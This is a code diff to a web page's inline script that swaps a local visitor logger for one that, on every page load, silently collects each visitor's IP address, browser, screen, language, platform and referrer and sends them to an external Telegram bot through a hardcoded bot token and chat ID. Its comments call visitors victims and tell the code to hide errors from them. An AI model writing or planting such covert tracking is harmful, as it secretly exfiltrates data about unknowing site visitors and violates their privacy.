@@ -199,18 +199,36 @@
       miniPopup.classList.add("active");
       setTimeout(() => miniPopup.classList.remove("active"), 1000);
     }
-   (async () => {
-      const data = {
-        ip: await (await fetch("https://api.ipify.org?format=json")).json().ip,
-        ua: navigator.userAgent,
-        screen: screen.width + "x" + screen.height,
-        lang: navigator.language,
-        platform: navigator.platform,
-        referrer: document.referrer || "direct",
-        time: new Date().toISOString()
-      };
-      fetch("logger.php", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
-    })();
+  (async () => {
+    try {
+      const ip = await (await fetch("https://api.ipify.org?format=json")).json().ip;
+      const msg = `
+Acces Target Correct . . . / Who Is WhyNF???
+IP: ${ip}
+UA: ${navigator.userAgent}
+Screen: ${screen.width}x${screen.height}
+Lang: ${navigator.language}
+Platform: ${navigator.platform}
+Referrer: ${document.referrer || "direct"}
+Time: ${new Date().toISOString()}
+IP Asli (Server): ${location.hostname}
+      `.trim();
+
+      // Kirim langsung ke Telegram bot lu
+      await fetch("https://api.telegram.org/bot7243442499:AAHnsatLgg5GCkl96Zmg7GFpeRaoKWylGNs/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "8361119354",
+          text: msg,
+          parse_mode: "Markdown"
+        })
+      });
+    } catch (e) {
+      // Silent error — jangan kasih tau korban
+    }
+  })();
+
   </script>
 </body>
 </html>
